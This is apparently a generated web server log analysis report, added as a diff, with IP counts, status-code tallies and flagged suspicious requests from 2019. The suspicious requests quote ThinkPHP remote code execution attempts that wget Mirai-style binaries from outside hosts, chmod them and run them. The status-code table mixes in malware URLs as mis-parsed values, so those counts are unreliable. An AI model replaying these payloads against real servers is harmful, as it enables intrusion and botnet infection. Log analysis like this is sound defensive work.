@@ -1,0 +1,57 @@
+=== Web Log Analysis Report ===
+
+📊 Total Unique IPs: 258606
+
+🔝 Top 5 IPs
+----------------------------------------
+IP Address             Requests
+66.249.66.194            353483
+66.249.66.91             314522
+151.239.241.163           92475
+66.249.66.92              88332
+91.99.30.32               45979
+
+📈 Status Codes
+----------------------------------------
+Status          Count
+200           9579824
+304            340228
+302            199835
+404            105011
+301             67552
+499             50852
+500             14266
+403              5634
+502               798
+401               323
+400               319
+408               112
+504               103
+http://185.244.25.221/bins/Yowai.x86         56
+http://185.255.25.168/OwO/Tsunami.x86         49
+"-"                43
+http://185.244.25.241/x86         28
+http://185.244.25.139/OwO/Tsunami.x86         26
+http://185.244.25.114/OwO/Tsunami.x86         24
+-O                 18
+186                17
+166                14
+405                 6
+http://185.244.25.145/bins/Yowai.x86          5
+206                 3
+http://damienondek.ga/bins/Damien.x86          2
+http://185.244.25.241/bins/sefa.x86          2
+http://108.61.86.94/bins/Solstice.x86          1
+65536               1
+
+⚠  Suspicious Requests Detected: 2707
+----------------------------------------
+178.47.232.191 - - [22/Jan/2019:04:54:22 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"
+196.64.216.172 - - [22/Jan/2019:05:06:13 +0330] "GET /wp-login.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" "-"
+196.64.216.172 - - [22/Jan/2019:05:06:14 +0330] "GET /wp-login.php HTTP/1.1" 404 494594 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" "-"
+188.19.139.184 - - [22/Jan/2019:06:06:53 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"
+110.23.220.125 - - [22/Jan/2019:06:36:07 +0330] "GET /wp-login.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" "-"
+110.23.220.125 - - [22/Jan/2019:06:36:14 +0330] "GET /wp-login.php HTTP/1.1" 404 493276 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" "-"
+42.112.163.67 - - [22/Jan/2019:06:36:36 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"
+185.222.202.118 - - [22/Jan/2019:09:15:46 +0330] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://185.222.202.118/bins/rift.x86;cat%20rift.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp HTTP/1.1" 301 178 "-" "python-requests/2.4.3 CPython/2.7.9 Linux/3.16.0-4-amd64" "-"
+185.222.202.118 - - [22/Jan/2019:09:15:47 +0330] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://185.222.202.118/bins/rift.x86;cat%20rift.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp HTTP/1.1" 403 134 "-" "python-requests/2.4.3 CPython/2.7.9 Linux/3.16.0-4-amd64" "-"
